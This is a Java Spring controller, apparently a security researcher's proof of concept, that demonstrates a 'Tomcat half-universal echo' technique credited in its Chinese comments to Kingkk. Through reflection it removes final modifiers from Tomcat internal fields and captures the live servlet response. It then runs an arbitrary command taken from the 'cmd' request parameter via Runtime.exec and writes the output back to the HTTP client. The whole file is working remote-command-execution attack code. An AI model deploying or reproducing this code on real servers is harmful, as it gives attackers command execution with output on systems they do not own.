package com.example.TomcatHalfEcho.Controller;


import org.apache.catalina.connector.Response;
import org.apache.catalina.connector.ResponseFacade;
import org.apache.catalina.core.ApplicationFilterChain;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;


import javax.servlet.ServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;


// Kingkk 师傅提出来的 Tomcat 半通用回显
@Controller
public class EvilController {

    @RequestMapping("/index")
    @ResponseBody
    public String IndexController(String cmd) throws IOException {
        try {
            // ApplicationDispatcher.WRAP_SAME_OBJECT变量修改为true
            Field WRAP_SAME_OBJECT_FIELD = Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");//获取WRAP_SAME_OBJECT字段
            Field modifiersField = Field.class.getDeclaredField("modifiers");//获取modifiers字段
            modifiersField.setAccessible(true);//将变量设置为可访问
            modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() & ~Modifier.FINAL);//取消FINAL属性
            WRAP_SAME_OBJECT_FIELD.setAccessible(true);//将变量设置为可访问
            WRAP_SAME_OBJECT_FIELD.setBoolean(null, true);//将变量设置为true

            // 用反射设置ApplicationDispathcer中的lastServicedResponse变量为修改访问
            Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");//获取lastServicedRequest变量
            Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");//获取lastServicedResponse变量
            modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() & ~Modifier.FINAL);//取消FINAL属性
            modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() & ~Modifier.FINAL);//取消FINAL属性
            lastServicedRequestField.setAccessible(true);//将变量设置为可访问
            lastServicedResponseField.setAccessible(true);//将变量设置为可访问

            ThreadLocal<ServletResponse> lastServicedResponse = (ThreadLocal<ServletResponse>) lastServicedResponseField.get(null); //获取lastServicedResponse变量

            // 如果此时 lastServicedResponse 对象为null，则进行初始化为ThreadLocal对象
            if (lastServicedResponse == null) {
                lastServicedRequestField.set(null, new ThreadLocal<>());//设置ThreadLocal对象
                lastServicedResponseField.set(null, new ThreadLocal<>());//设置ThreadLocal对象
            } else if (cmd != null) {
                // 否则则获取lastServicedResponse中的response对象，并执行命令将执行结果输入到response中
                ServletResponse responseFacade = lastServicedResponse.get();    //获取lastServicedResponse中存储的变量

                String res = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A").next();

                // 方法一：使用 outputStream.write() 方法输出
                // responseFacade.getOutputStream().write(res.getBytes(StandardCharsets.UTF_8));
                // responseFacade.flushBuffer();

                // 方法二：使用 writer.writeA() 方法输出
                PrintWriter writer = responseFacade.getWriter();    // 获取writer对象

                Field responseField = ResponseFacade.class.getDeclaredField("response");//获取response字段
                responseField.setAccessible(true);//将变量设置为可访问
                Response response = (Response) responseField.get(responseFacade);//获取变量
                Field usingWriter = Response.class.getDeclaredField("usingWriter");//获取usingWriter字段
                usingWriter.setAccessible(true);//将变量设置为可访问
                usingWriter.set((Object) response, Boolean.FALSE);//设置usingWriter为false

                writer.write(res);
                writer.flush();
            }
        }catch (Exception e) {
            e.printStackTrace();
        }

        return "test";

    }
}
